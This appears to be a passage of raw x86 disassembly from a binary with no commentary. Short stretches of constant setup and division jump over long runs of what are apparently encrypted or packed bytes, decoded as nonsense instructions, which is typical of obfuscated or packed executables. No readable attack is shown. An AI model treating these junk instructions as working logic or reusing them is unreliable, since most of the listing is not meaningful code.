  40d2a2:	mov    DWORD PTR [ebp-0x20],ebx
  40d2a5:	mov    DWORD PTR [ebp-0x24],0x5
  40d2ac:	mov    DWORD PTR [ebp-0x28],0x6686
  40d2b3:	mov    DWORD PTR [ebp-0x8],0x7cf1
  40d2ba:	mov    DWORD PTR [ebp-0x4],eax
  40d2bd:	mov    DWORD PTR [ebp+0x8],0x739a
  40d2c4:	mov    DWORD PTR [ebp-0xc],0xf3a
  40d2cb:	xor    edx,edx
  40d2cd:	mov    DWORD PTR [ebp-0x10],0x429
  40d2d4:	mov    eax,DWORD PTR [ebp-0x28]
  40d2d7:	mov    ecx,DWORD PTR [ebp-0x24]
  40d2da:	sub    eax,0x175c
  40d2df:	div    ecx
  40d2e1:	jmp    0x40d5a5
  40d2e6:	test   DWORD PTR [esi],esi
  40d2e8:	push   eax
  40d2e9:	inc    edx
  40d2ea:	sbb    bl,BYTE PTR [edx]
  40d2ec:	jnp    0x40d324
  40d2ee:	inc    esp
  40d2ef:	sbb    DWORD PTR [edi+0x7c],esi
  40d2f2:	ror    DWORD PTR [ebp-0x1dd24367],0x18
  40d2f9:	sbb    dl,dl
  40d2fb:	adc    al,0x18
  40d2fd:	sbb    cl,ah
  40d2ff:	or     eax,0xbc5bdf0a
  40d304:	ret    0x9249
  40d307:	popf   
  40d308:	scas   eax,DWORD PTR es:[edi]
  40d309:	fwait
  40d30a:	adc    ebx,DWORD PTR [eax+ebx*2+0x59]
  40d30e:	xchg   DWORD PTR gs:[ebx+ebx*1-0x2],ebp
  40d313:	lea    edx,[edx-0x3a]
  40d316:	ins    BYTE PTR es:[edi],dx
  40d317:	inc    ecx
  40d318:	hlt    
  40d319:	push   ebx
  40d31a:	adc    esi,edx
  40d31c:	xor    al,0x39
  40d31e:	and    eax,0xce77394c
  40d323:	(bad)  [edx-0x6f]
  40d326:	fild   QWORD PTR [ecx+0x29]
  40d329:	sub    eax,0x79f0401e
  40d32e:	jns    0x40d2f9
  40d330:	pop    ebx
  40d331:	mov    BYTE PTR [edx+0x1e],ch
  40d334:	cmp    bl,BYTE PTR [eax-0x57]
  40d337:	mov    dh,0x7e
  40d339:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d33a:	dec    ebp
  40d33b:	add    ebp,DWORD PTR [ebp-0x79e8a97]
  40d341:	push   es
  40d342:	cmp    BYTE PTR [ebp-0x11],al
  40d345:	mov    edi,0x9da87255
  40d34a:	inc    ebx
  40d34b:	(bad)  
  40d34c:	std    
  40d34d:	sti    
  40d34e:	xlat   BYTE PTR ds:[ebx]
  40d34f:	aad    0x25
  40d351:	scas   eax,DWORD PTR es:[edi]
  40d352:	inc    edx
  40d353:	into   
  40d354:	cs mov esi,0xdcbd26de
  40d35a:	shr    ebp,cl
  40d35c:	and    DWORD PTR [edx-0x3bc62a6f],esi
  40d362:	or     BYTE PTR [edi+0x40],ah
  40d365:	mov    al,ah
  40d367:	and    al,0x49
  40d369:	xchg   esi,eax
  40d36a:	inc    ebp
  40d36b:	iret   
  40d36c:	adc    ch,BYTE PTR [ebx]
  40d36e:	push   ebx
  40d36f:	leave  
  40d370:	rcl    bl,0xae
  40d373:	or     BYTE PTR [ebx],0x63
  40d376:	mov    ecx,0x8a45487c
  40d37b:	xor    esp,DWORD PTR [esi+0x65]
  40d37e:	inc    DWORD PTR [ebx-0x7f]
  40d381:	nop
  40d382:	pop    ecx
  40d383:	mov    DWORD PTR [edi],esp
  40d385:	xchg   esp,eax
  40d386:	pop    ds
  40d387:	popa   
  40d388:	dec    ebx
  40d389:	inc    edx
  40d38a:	and    al,0xe5
  40d38c:	scas   eax,DWORD PTR es:[edi]
  40d38d:	jns    0x40d3c5
  40d38f:	mov    ecx,0xa0c27e95
  40d394:	sub    esp,esp
  40d396:	pop    eax
  40d397:	jne    0x40d3b2
  40d399:	out    dx,eax
  40d39a:	push   edi
  40d39b:	adc    BYTE PTR [ebx],ch
  40d39d:	jge    0x40d3a1
  40d39f:	(bad)  
  40d3a0:	xor    bl,cl
  40d3a2:	test   eax,0x979d5d05
  40d3a7:	pusha  
  40d3a8:	mov    dh,0x4c
  40d3aa:	mov    ah,0xbf
  40d3ac:	cld    
  40d3ad:	mov    eax,0xcde1e1e8
  40d3b2:	push   eax
  40d3b3:	xchg   ebp,eax
  40d3b4:	repz mov dl,0x1e
  40d3b7:	lahf   
  40d3b8:	pusha  
  40d3b9:	pop    eax
  40d3ba:	out    0xb9,eax
  40d3bc:	pop    esi
  40d3bd:	arpl   WORD PTR [ebx+0x59f7dc30],dx
  40d3c3:	inc    eax
  40d3c4:	push   edx
  40d3c5:	loop   0x40d3c8
  40d3c7:	jnp    0x40d3ad
  40d3c9:	sbb    eax,0x6809f8bc
  40d3ce:	(bad)  [esi]
  40d3d0:	stos   BYTE PTR es:[edi],al
  40d3d1:	idiv   BYTE PTR [ebp+0x5c2a0ca5]
  40d3d7:	jns    0x40d3b2
  40d3d9:	dec    ebx
  40d3da:	pop    esp
  40d3db:	add    edx,ecx
  40d3dd:	lahf   
  40d3de:	cwde   
  40d3df:	(bad)  
  40d3e0:	adc    BYTE PTR [ecx-0x34],dh
  40d3e3:	jp     0x40d3ab
  40d3e5:	cs jb  0x40d3ac
  40d3e8:	cmp    DWORD PTR [eax-0x76],edi
  40d3eb:	in     al,dx
  40d3ec:	inc    esi
  40d3ed:	inc    edx
  40d3ee:	push   0x6a
  40d3f0:	shl    BYTE PTR [edx+0x7e836fde],cl
  40d3f6:	retf   
  40d3f7:	mov    bl,0x17
  40d3f9:	sbb    eax,0xcdda6160
  40d3fe:	inc    ebx
  40d3ff:	jno    0x40d3a8
  40d401:	ins    DWORD PTR es:[edi],dx
  40d402:	mov    DWORD PTR cs:[edi],esi
  40d405:	(bad)  
  40d406:	repz jp 0x40d46c
  40d409:	out    dx,al
  40d40a:	push   0x2bee824c
  40d40f:	xchg   DWORD PTR [edx+0x1c529400],esi
  40d415:	mov    cl,0xbf
  40d417:	mov    ch,0x46
  40d419:	cmc    
  40d41a:	xor    DWORD PTR ds:0x48ee07d5,edi
  40d420:	jmp    0x9641:0x43c891e8
  40d427:	out    0x2f,eax
  40d429:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d42a:	inc    esi
  40d42b:	push   eax
  40d42c:	test   BYTE PTR [eax-0x3e358545],cl
  40d432:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d433:	pushw  0xffd9
  40d436:	xchg   ebp,eax
  40d437:	or     cl,BYTE PTR ds:0x3bf8e55c
  40d43d:	and    bl,BYTE PTR [ecx+0x16]
  40d440:	neg    BYTE PTR [edx-0x18]
  40d443:	stos   BYTE PTR es:[edi],al
  40d444:	call   0x93b:0x119f9701
  40d44b:	add    ah,BYTE PTR [ebx]
  40d44d:	push   ebp
  40d44e:	xchg   esi,eax
  40d44f:	fcmove st,st(4)
  40d451:	inc    esp
  40d452:	test   BYTE PTR [esi+0x53],ah
  40d455:	dec    ecx
  40d456:	xchg   esi,eax
  40d457:	mov    edx,0x71c7230e
  40d45c:	stc    
  40d45d:	inc    esp
  40d45e:	xor    bh,BYTE PTR [esi-0x32c4b042]
  40d464:	jne    0x40d41d
  40d466:	(bad)  
  40d467:	bound  ebx,QWORD PTR [edx]
  40d469:	pop    edx
  40d46a:	shl    DWORD PTR [edx+eax*4],cl
  40d46d:	int    0x17
  40d46f:	clc    
  40d470:	sub    al,BYTE PTR [esi+0x7c3b33d2]
  40d476:	mov    WORD PTR [ebx+edi*4+0x55974fc7],cs
  40d47d:	push   edi
  40d47e:	push   ss
  40d47f:	repnz mov eax,0xdd7bc228
  40d485:	retf   0xdc5e
  40d488:	jno    0x40d4ec
  40d48a:	sub    ah,BYTE PTR [eax]
  40d48c:	push   es
  40d48d:	fcmovb st,st(0)
  40d48f:	mov    ?,WORD PTR [esi+0x39]
  40d492:	lock lock test al,0x55
  40d496:	or     ecx,DWORD PTR [ebp-0x5b]
  40d499:	not    DWORD PTR [esi-0x15]
  40d49c:	les    esp,FWORD PTR [eax-0x1f6106dd]
  40d4a2:	or     BYTE PTR [esi],0xeb
  40d4a5:	std    
  40d4a6:	imul   BYTE PTR [edi-0x52ccb545]
  40d4ac:	jne    0x40d4fa
  40d4ae:	xchg   edx,eax
  40d4af:	cmp    DWORD PTR [ecx+0x35da8eab],edx
  40d4b5:	cdq    
  40d4b6:	outs   dx,DWORD PTR ds:[esi]
  40d4b7:	push   esp
  40d4b8:	pop    esi
  40d4b9:	ja     0x40d476
  40d4bb:	cdq    
  40d4bc:	adc    DWORD PTR [esi+0x312c1239],ebx
  40d4c2:	scas   al,BYTE PTR es:[edi]
  40d4c3:	pop    esp
  40d4c4:	fnstenv [ebx]
  40d4c6:	or     BYTE PTR es:[ebp+edx*2-0x78],0xe5
  40d4cc:	push   eax
  40d4cd:	mov    ch,0x9d
  40d4cf:	mov    ah,0xda
  40d4d1:	fs fwait
  40d4d3:	ror    BYTE PTR [eax],cl
  40d4d5:	nop
  40d4d6:	mov    edx,0x28ea4095
  40d4db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4dc:	js     0x40d4d0
  40d4de:	test   al,0xd3
  40d4e0:	je     0x40d4e3
  40d4e2:	jmp    0x40d4c6
  40d4e4:	jge    0x40d497
  40d4e6:	mov    BYTE PTR ds:0xd0277d,bl
  40d4ec:	and    BYTE PTR [eax-0x1df7b5f],dl
  40d4f2:	inc    esi
  40d4f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4f4:	sti    
  40d4f5:	rcr    DWORD PTR [edx],0x50
  40d4f8:	fwait
  40d4f9:	adc    eax,0xb0722704
  40d4fe:	xlat   BYTE PTR ds:[ebx]
  40d4ff:	cmp    eax,0x8988cc
  40d504:	enter  0x34df,0xb9
  40d508:	data16 mov bl,0x9e
  40d50b:	sahf   
  40d50c:	rol    eax,0x65
  40d50f:	mov    eax,0x8535bf95
  40d514:	adc    al,0x9c
  40d516:	popf   
  40d517:	push   ebx
  40d518:	stos   BYTE PTR es:[edi],al
  40d519:	aad    0x1a
  40d51b:	repz lds edx,FWORD PTR [edx-0x5997afa6]
  40d522:	and    BYTE PTR [edi+0x7eba4e18],al
  40d528:	je     0x40d4ad
  40d52a:	mov    al,0x96
  40d52c:	cmp    bh,0x91
  40d52f:	and    DWORD PTR ds:0x2434050d,ecx
  40d535:	dec    edi
  40d536:	jge    0x40d568
  40d538:	jno    0x40d4e4
  40d53a:	fcom   DWORD PTR [esi-0x42]
  40d53d:	addr16 inc esp
  40d53f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d540:	add    eax,0xb8ff2e0d
  40d545:	retf   0xe2f1
  40d548:	xor    bh,BYTE PTR [ebp+0x229063a2]
  40d54e:	mov    bl,0x34
  40d550:	jae    0x40d50e
  40d552:	jae    0x40d558
  40d554:	add    BYTE PTR [edx+0x72],dl
  40d557:	daa    
  40d558:	add    DWORD PTR [eax],esp
  40d55a:	retf   0xf6a9
  40d55d:	push   ebp
  40d55e:	lds    edi,FWORD PTR [esi+ebx*8-0x695329d5]
  40d565:	jae    0x40d593
  40d567:	(bad)  [ecx]
  40d569:	adc    ecx,ecx
  40d56b:	stc    
  40d56c:	add    edi,0x35
  40d56f:	pop    ss
  40d570:	xchg   esi,eax
  40d571:	sub    DWORD PTR [edx+ebp*1+0x60],edi
  40d575:	pop    ds
  40d576:	ja     0x40d51a
  40d578:	pop    ss
  40d579:	dec    esi
  40d57a:	xor    dh,BYTE PTR [ebx+0x73]
  40d57d:	mov    BYTE PTR [eax],0xc0
  40d580:	in     al,0xa0
  40d582:	mov    bh,dl
  40d584:	mov    dh,0xee
  40d586:	popf   
  40d587:	fs sbb eax,0xc3f6b01
  40d58d:	xor    DWORD PTR [eax],esi
  40d58f:	fld    DWORD PTR [eax]
  40d591:	and    BYTE PTR [ebx+0xb],ch
  40d594:	out    dx,al
  40d595:	rol    BYTE PTR fs:[edx],0x3f
  40d599:	movzx  esp,BYTE PTR [esi]
  40d59c:	test   al,0xd9
  40d59e:	gs mov cl,cl
  40d5a1:	mov    WORD PTR [ecx+0x4d8bd4c6],ss
  40d5a7:	loopne 0x40d5dc
  40d5a9:	shr    cl,cl
  40d5ab:	mov    edi,0x5a000002
  40d5b0:	fdiv   DWORD PTR [edi+0x64]
  40d5b3:	sbb    esp,DWORD PTR [edx]
  40d5b5:	pop    edx
  40d5b6:	into   
  40d5b7:	sbb    edi,ecx
  40d5b9:	jae    0x40d637
  40d5bb:	in     al,dx
  40d5bc:	pop    ebp
  40d5bd:	arpl   WORD PTR [edi+eiz*8-0x2de7e724],di
  40d5c4:	adc    al,0x18
  40d5c6:	sbb    BYTE PTR [eax],dh
  40d5c8:	dec    esp
  40d5c9:	inc    ebx
  40d5ca:	fistp  WORD PTR [esi+eiz*4-0x42ac6d93]
  40d5d1:	mov    eax,ds:0xea894a5d
  40d5d6:	sub    cl,cl
  40d5d8:	mov    BYTE PTR [edx-0x63],bl
  40d5db:	push   es
  40d5dc:	mov    bl,0xdf
  40d5de:	arpl   si,sp
  40d5e0:	and    cl,bl
  40d5e2:	cli    
  40d5e3:	push   edx
  40d5e4:	jg     0x40d63c
  40d5e6:	add    eax,edx
  40d5e8:	retf   0x18bd
  40d5eb:	jo     0x40d5dd
  40d5ed:	enter  0xab3f,0x52
  40d5f1:	or     BYTE PTR [ebp+0x5c],ah
  40d5f4:	dec    eax
  40d5f5:	pop    ds
  40d5f6:	ins    DWORD PTR es:[edi],dx
  40d5f7:	fisubr WORD PTR ds:0x8b6c707d
  40d5fd:	fcom   QWORD PTR [ebp+0x56bd2ed3]
  40d603:	mov    eax,ds:0x160729be
  40d608:	inc    esi
  40d609:	fs cli 
  40d60b:	pop    edx
  40d60c:	mov    al,0xfa
  40d60e:	fwait
  40d60f:	pop    es
  40d610:	mov    BYTE PTR [esi-0x17],0xae
  40d614:	sub    eax,0x1becc967
  40d619:	cmp    edx,eax
  40d61b:	pop    ss
  40d61c:	pop    edx
  40d61d:	push   0xc18a5409
  40d622:	jp     0x40d637
  40d624:	retf   
  40d625:	sub    al,0xcb
  40d627:	cmp    ah,BYTE PTR [edi-0x225f56da]
  40d62d:	ja     0x40d5cb
  40d62f:	retf   
  40d630:	and    cl,BYTE PTR [edi+edi*1+0x65]
  40d634:	push   ebp
  40d635:	sbb    eax,0x6ac11882
  40d63a:	mov    edx,0x1a74927e
  40d63f:	cs mov ah,0x69
  40d642:	dec    ecx
  40d643:	inc    edi
  40d644:	cdq    
  40d645:	sub    BYTE PTR [esi],ah
  40d647:	jp     0x40d680
  40d649:	inc    esi
  40d64a:	adc    edi,DWORD PTR [ecx+0x49]
  40d64d:	call   0xdeb:0x1e639eb8
  40d654:	icebp  
  40d655:	adc    DWORD PTR [ebx+0x43],0x374505e3
  40d65c:	xor    ecx,DWORD PTR [ebp-0x37c317cd]
  40d662:	xchg   ecx,eax
  40d663:	pushf  
  40d664:	xlat   BYTE PTR ds:[ebx]
  40d665:	pop    ds
  40d666:	mov    ch,0x7e
  40d668:	sbb    dh,BYTE PTR ds:0x75053968
  40d66e:	or     eax,0x78e29c4d
  40d673:	lods   eax,DWORD PTR ds:[esi]
  40d674:	sbb    dh,dl
  40d676:	mov    WORD PTR [edi+eax*8-0xf],?
  40d67a:	push   ss
  40d67b:	aas    
  40d67c:	jno    0x40d660
  40d67e:	push   esp
  40d67f:	shl    dl,0x27
  40d682:	repz cmp DWORD PTR [eax],ebx
  40d685:	mov    dh,0x7e
  40d687:	xlat   BYTE PTR ds:[ebx]
  40d688:	mov    ch,0x84
  40d68a:	cmp    BYTE PTR [ebx+0x60],bh
  40d68d:	sub    BYTE PTR [edx+ebx*1+0xd],bl
  40d691:	sub    DWORD PTR [ebx-0x54],eax
  40d694:	cmc    
  40d695:	cmp    eax,0x3f53202c
  40d69a:	mov    cl,0x33
  40d69c:	sti    
  40d69d:	vpcmpeqd xmm2,xmm6,xmm2
  40d6a1:	aad    0xa3
  40d6a3:	mov    esp,0x5cf8ef59
  40d6a8:	xor    edx,DWORD PTR [ebx-0xf29f553]
  40d6ae:	sbb    bl,BYTE PTR [eax+0x294ae797]
  40d6b4:	aaa    
  40d6b5:	sub    ebp,esp
  40d6b7:	add    DWORD PTR [eax],0x62ed30f4
  40d6bd:	jo     0x40d72c
  40d6bf:	or     eax,0xe43c004d
  40d6c4:	out    dx,eax
  40d6c5:	out    dx,eax
  40d6c6:	aam    0xf6
  40d6c8:	push   ss
  40d6c9:	dec    edx
  40d6ca:	outs   dx,DWORD PTR ds:[esi]
  40d6cb:	lods   eax,DWORD PTR ss:[esi]
  40d6cd:	cmp    ebp,DWORD PTR [esi+0x197ddddb]
  40d6d3:	and    BYTE PTR [eax-0xf],bh
  40d6d6:	mov    dl,0xc7
  40d6d8:	adc    DWORD PTR [edi-0x69],edx
  40d6db:	fnsave [edx-0xe]
  40d6de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6df:	sahf   
  40d6e0:	mov    DWORD PTR ds:0x4206d31f,edx
  40d6e6:	lock push ebx
  40d6e8:	arpl   WORD PTR [ecx-0x4cfdae11],dx
  40d6ee:	sub    al,0xdd
  40d6f0:	pop    edx
  40d6f1:	dec    ebx
  40d6f2:	call   0xbff7:0x9e9b95a2
  40d6f9:	xchg   esi,eax
  40d6fa:	gs test eax,0xfa1a4060
  40d700:	test   ecx,edi
  40d702:	inc    ebx
  40d703:	cmp    al,0x3c
  40d705:	ins    BYTE PTR es:[edi],dx
  40d706:	inc    esp
  40d707:	xchg   ebx,eax
  40d708:	inc    esp
  40d709:	mov    ch,al
  40d70b:	fs adc eax,0x778dbc2d
  40d711:	leave  
  40d712:	iret   
  40d713:	sub    ah,al
  40d715:	and    ebp,DWORD PTR [ebx-0x602515fa]
  40d71b:	in     eax,0x23
  40d71d:	xchg   esp,eax
  40d71e:	sub    ecx,DWORD PTR [esi]
  40d720:	pop    esi
  40d721:	pop    edx
  40d722:	sbb    DWORD PTR [ebp+0x3437b56d],ebp
  40d728:	out    0x77,al
  40d72a:	sahf   
  40d72b:	push   eax
  40d72c:	stos   BYTE PTR es:[edi],al
  40d72d:	popa   
  40d72e:	out    dx,al
  40d72f:	imul   esp,DWORD PTR [edi+0x44],0xbea67769
  40d736:	sbb    al,0x81
  40d738:	lds    ebx,FWORD PTR [ecx]
  40d73a:	je     0x40d7b7
  40d73c:	(bad)  
  40d73e:	mov    edi,0x210a7955
  40d743:	into   
  40d744:	ins    DWORD PTR es:[edi],dx
  40d745:	(bad)  
  40d746:	push   edx
  40d747:	lea    edi,[ebx]
  40d749:	or     ah,BYTE PTR ds:0x70cc50ce
  40d74f:	adc    eax,DWORD PTR [ecx-0x4c]
  40d752:	call   0xd1503d2
  40d757:	sbb    BYTE PTR [ebp+0x1d],al
  40d75a:	cmp    DWORD PTR [eax+0x75b567d6],esp
  40d760:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d761:	dec    eax
  40d762:	ret    0x817
  40d765:	push   esi
  40d766:	push   eax
  40d767:	test   BYTE PTR ds:0x1f821317,cl
  40d76d:	jecxz  0x40d7cf
  40d76f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d770:	neg    bh
  40d772:	fdivr  QWORD PTR [ebx-0x1f0a1e3f]
  40d778:	sahf   
  40d779:	jg     0x40d73a
  40d77b:	push   ebx
  40d77c:	xor    esi,DWORD PTR [ebx+0x738a779f]
  40d782:	loopne 0x40d7be
  40d784:	jae    0x40d733
  40d786:	aam    0xef
  40d788:	mov    WORD PTR [ecx+0x69fa59a7],cs
  40d78e:	test   DWORD PTR [edi-0x235163d7],0xff16fac6
  40d798:	xchg   edi,eax
  40d799:	mov    fs,WORD PTR [ebx-0x1e]
  40d79c:	mov    bh,0x21
  40d79e:	adc    eax,0xc3bc74d5
  40d7a3:	mov    bh,0x9b
  40d7a5:	mov    dh,0xdd
  40d7a7:	inc    ebp
  40d7a8:	lods   al,BYTE PTR ds:[esi]
  40d7a9:	sbb    esp,DWORD PTR [esi]
  40d7ab:	lea    edx,[ecx+0x46]
  40d7ae:	xor    BYTE PTR [ebx+ecx*4-0x59],cl
  40d7b2:	push   ss
  40d7b3:	inc    eax
  40d7b4:	push   0x61
  40d7b6:	push   ebp
  40d7b7:	and    BYTE PTR [edx-0x31],0xfc
  40d7bb:	or     BYTE PTR [eax+0x7a],dl
  40d7be:	xchg   esi,eax
  40d7bf:	mov    eax,ds:0xe84470
  40d7c4:	mov    ds:0xdbee82a6,eax
  40d7c9:	loope  0x40d7fc
  40d7cb:	cmc    
  40d7cc:	jp     0x40d800
  40d7ce:	fcomp  DWORD PTR [ebp+0x4b]
  40d7d1:	fstp   TBYTE PTR [edx+edi*2-0x1d]
  40d7d5:	add    ebx,DWORD PTR [ebp+0x29]
  40d7d8:	sbb    DWORD PTR [edx],0xeaf3541a
  40d7de:	daa    
  40d7df:	xlat   BYTE PTR ds:[ebx]
  40d7e0:	imul   ebx,edi,0x3e27ddcf
  40d7e6:	nop
  40d7e7:	fidivr WORD PTR [ebx-0x39]
  40d7ea:	push   esi
  40d7eb:	dec    ebx
  40d7ec:	adc    DWORD PTR [ecx-0x7bcc7020],ecx
  40d7f2:	call   0xd0d1:0x2fac06f6
  40d7f9:	mov    ch,dl
  40d7fb:	in     eax,0x40
  40d7fd:	pop    ds
  40d7fe:	shr    BYTE PTR ds:0x42831e32,cl
  40d804:	xor    dh,BYTE PTR [bx+di+0xc]
  40d808:	adc    BYTE PTR [eax-0x75],0x48
  40d80c:	cmp    ch,al
  40d80e:	jl     0x40d7cd
  40d810:	cmp    cl,cl
  40d812:	and    ecx,DWORD PTR [ebx]
  40d814:	arpl   WORD PTR [edx+0x20d32082],si
  40d81a:	jns    0x40d822
  40d81c:	(bad)  
  40d81d:	in     al,0xfb
  40d81f:	xchg   esi,eax
  40d820:	sub    BYTE PTR [ecx+ecx*1-0x3e],bh
  40d824:	mov    bl,0xd7
  40d826:	and    ecx,ecx
  40d828:	or     BYTE PTR [edi],bl
  40d82a:	xor    al,0x52
  40d82c:	sbb    eax,0x9670240a
  40d831:	cmp    bh,BYTE PTR [eax]
  40d833:	enter  0xaa3f,0xc3
  40d837:	pusha  
  40d838:	ret    0xd7d1
  40d83b:	lds    eax,FWORD PTR [ecx+edx*1+0x4f]
  40d83f:	loopne 0x40d8ba
  40d841:	mov    edx,0x8d21d25c
  40d846:	call   DWORD PTR [esi-0x7f2e0b80]
  40d84c:	and    al,0x36
  40d84e:	xchg   esi,eax
  40d84f:	in     eax,dx
  40d850:	inc    edi
  40d851:	das    
  40d852:	jecxz  0x40d863
  40d854:	sbb    ebx,ebp
  40d856:	jne    0x40d7f3
  40d858:	cmp    eax,0x321fb109
  40d85d:	dec    esi
  40d85e:	stc    
  40d85f:	pusha  
  40d860:	fcomp  DWORD PTR [ecx]
  40d862:	pop    esi
  40d863:	mov    bl,0xe1
  40d865:	sub    eax,0x7405f0c6
  40d86a:	mov    al,BYTE PTR [edi]
  40d86c:	xchg   BYTE PTR [eax-0x41],cl
  40d86f:	mov    ch,0x4d
  40d871:	add    BYTE PTR [eax],al
  40d873:	div    ecx
  40d875:	mov    ecx,DWORD PTR [ebp-0x1c]
  40d878:	xor    edx,edx
  40d87a:	div    ecx
  40d87c:	xor    edx,edx
  40d87e:	mov    ecx,eax
  40d880:	jmp    0x40db44
  40d885:	aam    0x63
  40d887:	sbb    eax,0xcc1a1a64
  40d88c:	and    edx,DWORD PTR [ebp+0x79]
  40d88f:	test   eax,0x9421bc
  40d894:	mov    esi,0x1818d8a0
  40d899:	rcl    BYTE PTR [eax+ebx*1],cl
  40d89c:	sbb    BYTE PTR [ecx-0x16],ah
  40d89f:	scas   eax,DWORD PTR es:[edi]
  40d8a0:	clc    
  40d8a1:	sbb    BYTE PTR [edx+0x554272ff],bh
  40d8a7:	lods   eax,DWORD PTR ds:[esi]
  40d8a8:	add    al,0xda
  40d8aa:	mov    edx,0x78dd8c5a
  40d8af:	inc    edi
  40d8b0:	push   ecx
  40d8b1:	test   eax,0x6a5f43ed
  40d8b6:	nop
  40d8b7:	mov    al,0x85
  40d8b9:	pop    ss
  40d8ba:	stos   DWORD PTR es:[edi],eax
  40d8bb:	pop    eax
  40d8bc:	push   0x96222fe2
  40d8c1:	cmp    BYTE PTR [esi],al
  40d8c3:	jmp    0xebfe:0x32e7460
  40d8ca:	add    DWORD PTR [esi+0x34],esp
  40d8cd:	add    esp,DWORD PTR [ecx+edx*8]
  40d8d0:	or     DWORD PTR [ecx+eiz*4],edx
  40d8d3:	inc    edx
  40d8d4:	sbb    al,0x8d
  40d8d6:	mov    bl,0x3f
  40d8d8:	lds    esi,FWORD PTR [ebx-0x2af3583e]
  40d8de:	arpl   WORD PTR [ebx+0xa61fcb0],sp
  40d8e4:	mov    bh,0xa1
  40d8e6:	mov    ecx,0x1e77c4ca
  40d8eb:	cmp    eax,0xb7914ff5
  40d8f0:	mov    ?,WORD PTR [edx]
  40d8f2:	mov    esi,0xeab94c17
  40d8f7:	xchg   edi,eax
  40d8f8:	sti    
  40d8f9:	neg    DWORD PTR [ecx-0x3b6f5601]
  40d8ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d900:	sbb    dh,BYTE PTR [ebx-0x38]
  40d903:	int3   
  40d904:	sahf   
  40d905:	jmp    0x8ad96d5
  40d90a:	cs adc esi,esp
  40d90d:	push   edx
  40d90e:	je     0x40d8c1
  40d910:	pop    edi
  40d911:	and    esp,DWORD PTR [edi]
  40d913:	mov    al,0xa6
  40d915:	xchg   esp,eax
  40d916:	sar    DWORD PTR [ebp+0x5f1b51ee],0x98
  40d91d:	lahf   
  40d91e:	js     0x40d937
  40d920:	jmp    0xdeb1:0xc0f91312
  40d927:	ret    
  40d928:	sub    DWORD PTR [esi-0xcb841c0],edi
  40d92e:	loopne 0x40d8cf
  40d930:	and    ah,BYTE PTR [ecx+0x12f4b6c4]
  40d936:	aad    0x6d
  40d938:	lea    ecx,[esi-0x1]
  40d93b:	mov    DWORD PTR [ebp+0x26259c41],0x3d360c3b
  40d945:	or     al,0x5
  40d947:	or     dl,BYTE PTR ds:0x8b80891e
  40d94d:	inc    edi
  40d94e:	in     al,dx
  40d94f:	xor    eax,0x653a01c2
  40d954:	stos   DWORD PTR es:[edi],eax
  40d955:	add    eax,0xb16fe2c9
  40d95a:	fcom   st(1)
  40d95c:	aas    
  40d95d:	gs popa 
  40d95f:	fmul   QWORD PTR [edi-0xbed9410]
  40d965:	fisubr DWORD PTR ds:0xc3fd618f
  40d96b:	and    DWORD PTR [ebx],edx
  40d96d:	leave  
  40d96e:	int3   
  40d96f:	jb     0x40d9dd
  40d971:	stos   DWORD PTR es:[edi],eax
  40d972:	std    
  40d973:	inc    ecx
  40d974:	mov    eax,ds:0x992f46c2
  40d979:	adc    eax,0xdb3914a3
  40d97e:	mov    ebp,0xc9d34b46
  40d983:	ins    BYTE PTR es:[edi],dx
  40d984:	ret    
  40d985:	push   ds
  40d986:	scas   al,BYTE PTR es:[edi]
  40d987:	retf   
  40d988:	stos   DWORD PTR es:[edi],eax
  40d989:	sub    al,0xff
  40d98b:	xchg   esi,eax
  40d98c:	or     al,0x65
  40d98e:	in     eax,0x62
  40d990:	jecxz  0x40d9dd
  40d992:	imul   ecx,DWORD PTR [edi],0x77
  40d995:	jbe    0x40d934
  40d997:	xchg   esp,eax
  40d998:	repz and edx,DWORD PTR [ebx-0x7b69b68c]
  40d99f:	out    dx,al
  40d9a0:	gs test dh,dl
  40d9a3:	dec    ecx
  40d9a4:	popa   
  40d9a5:	sub    DWORD PTR [esi-0x2b32e4c4],ebx
  40d9ab:	cs inc esi
  40d9ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d9ae:	and    ah,BYTE PTR [ebp+0x43]
  40d9b1:	cli    
  40d9b2:	ja     0x40d97c
  40d9b4:	adc    al,0xb3
  40d9b6:	mov    bl,0x2c
  40d9b8:	aad    0xa5
  40d9ba:	xlat   BYTE PTR ds:[ebx]
  40d9bb:	pop    es
  40d9bc:	xlat   BYTE PTR ds:[ebx]
  40d9bd:	fnstcw WORD PTR [edx]
  40d9bf:	adc    DWORD PTR [edx-0x6f],0xffffffb1
  40d9c3:	xchg   BYTE PTR [ecx+0x1dafed37],bh
  40d9c9:	mov    eax,0x248a2ec
  40d9ce:	retf   0xb064
  40d9d1:	cwde   
  40d9d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9d3:	or     bl,BYTE PTR [esi-0x3]
  40d9d6:	cmc    
  40d9d7:	cmc    
  40d9d8:	cmp    ebx,ebp
  40d9da:	jle    0x40d9c2
  40d9dc:	xor    DWORD PTR [edx-0x402f784f],edx
  40d9e2:	xchg   edx,eax
  40d9e3:	sahf   
  40d9e4:	and    BYTE PTR [eax+0x19c9f128],bh
  40d9ea:	mov    dh,0x32
  40d9ec:	dec    ebx
  40d9ed:	outs   dx,DWORD PTR ds:[esi]
  40d9ee:	and    DWORD PTR [ecx+0x29],esi
  40d9f1:	aam    0xf7
  40d9f3:	and    BYTE PTR [edx+0x40],bh
  40d9f6:	scas   eax,DWORD PTR es:[edi]
  40d9f7:	loopne 0x40d9a7
  40d9f9:	js     0x40d9f2
  40d9fb:	or     al,0x2c
  40d9fd:	dec    ebp
  40d9fe:	pop    ss
  40d9ff:	mov    al,0xaf
  40da01:	mov    bl,0xdb
  40da03:	out    dx,al
  40da04:	sbb    BYTE PTR [ecx],ah
  40da06:	test   ah,0xb3
  40da09:	cmp    al,0x42
  40da0b:	fistp  DWORD PTR [edi+0x61]
